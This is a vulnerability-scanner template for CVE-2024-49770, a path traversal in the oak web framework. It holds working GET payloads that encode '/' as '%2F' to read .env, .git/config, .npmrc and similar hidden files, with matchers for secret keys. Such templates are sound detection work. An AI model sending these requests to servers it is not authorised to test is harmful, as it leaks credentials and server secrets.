id: CVE-2024-49770

info:
  name: Oak Framework - Path Traversal
  author: KoYejune0302
  severity: high
  description: |
    `oak` is a middleware framework for Deno's native HTTP server, Deno Deploy, Node.js 16.5 and later, Cloudflare Workers and Bun. By default `oak` does not allow transferring of hidden files with `Context.send` API. However, prior to version 17.1.3, this can be bypassed by encoding `/` as its URL encoded form `%2F`. For an attacker this has potential to read sensitive user data or to gain access to server secrets. Version 17.1.3 fixes the issue.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-49770
    - https://github.com/oakserver/oak/security/advisories/GHSA-qm92-93fv-vh7m
    - https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125
    - https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25
    - https://github.com/oakserver/oak/commit/4b2f27efd5cba5a45b2c3982e610da3af0869209
  classification:
    epss-score: 0.00045
    epss-percentile: 0.17569
  metadata:
    verified: true
  tags: cve,cve2024,oak,lfi,oos

http:
  - method: GET
    path:
      - "{{BaseURL}}/temp%2f../.env"
      - "{{BaseURL}}/temp%2f../.git/config"
      - "{{BaseURL}}/temp%2f../.htaccess"
      - "{{BaseURL}}/temp%2f../.npmrc"
      - "{{BaseURL}}/temp%2f../.dockerignore"

    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "SECRET_KEY="
          - "\\[core\\]"
          - "AuthType"
          - "registry="
          - "docker"
          - "KEY="
          - "API_KEY="
        condition: or
